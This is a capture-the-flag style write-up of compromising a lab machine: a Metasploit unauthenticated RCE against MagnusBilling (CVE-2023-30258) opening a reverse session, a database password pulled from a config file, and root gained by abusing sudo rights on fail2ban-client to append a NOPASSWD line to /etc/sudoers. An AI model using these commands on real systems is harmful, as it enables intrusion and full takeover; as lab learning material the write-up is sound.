```

Lets see port 80.
![](Pasted%20image%2020250308033038.png)

Lets try to search for possible exploits and default creds.
![](Pasted%20image%2020250308032906.png)

And there is a unauthenticated RCE on it.
Lets try to search it on meterpreter.
![](Pasted%20image%2020250308033223.png)

## Exploit

Hmm so there is possible exploit.
Lets try this.
```
use 3
set LHOST tun0
set RHOSTS machine_ip
run
```

And we can see, it worked.
![](Pasted%20image%2020250308033410.png)

Note:this might also work.
[CVE-2023-30258](https://github.com/hadrian3689/)

## Privelege Escalation

Lets enumerate further.
And doing `sudo -l`, we can see this.
![](Pasted%20image%2020250308034458.png)

But lets first of all run linpeas.sh.
Hmm root is little bit trickier.

Reading config files showed this.
![](Pasted%20image%2020250308044851.png)

And that leads to this.
![](Pasted%20image%2020250308044925.png)

We have the db password.
```
dbhost = 127.0.0.1
dbname = mbilling
dbuser = mbillingUser
dbpass = BLOGYwvtJkI7uaX5

```

Lets try to login.
`mysql -u mbillingUser -p`
![](Pasted%20image%2020250308045153.png)

Lets enumerate this too.
We got the hash but it is also a rabbithole.
![](Pasted%20image%2020250308051547.png)

After  trying different things and talking with AI.
We could this.
`sudo /usr/bin/fail2ban-client status`
So the `fail2ban-client` is the tool for making a bruteforce attacks hard.
So we will use it here to escalate our privelege.

First we will create our own action.
`sudo /usr/bin/fail2ban-client set sshd addaction myaction`

So it add the new action named myaction to the sshd jail.

Now we need to define what our custom action does.
`sudo /usr/bin/fail2ban-client set sshd action myaction actionban "echo 'asterisk ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"`

So here, `echo 'asterisk ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` will triggered when sshd jail is triggered.
So we set the sshd action to our action and which will do a specific action to stop or reduce attack but here we used it to escalate our privelege to root.
![](Pasted%20image%2020250308055753.png)

And now we need to trigger that jail, So we can try to do failed ssh or use hydra for it.
![](Pasted%20image%2020250308060200.png)

And now if it is successful,we can see like this.
![](Pasted%20image%2020250308055859.png)

Now we can easily become root.
![](Pasted%20image%2020250308060038.png)

## Done

And done.
![](Pasted%20image%2020250308060453.png)

And learned lots of things again.
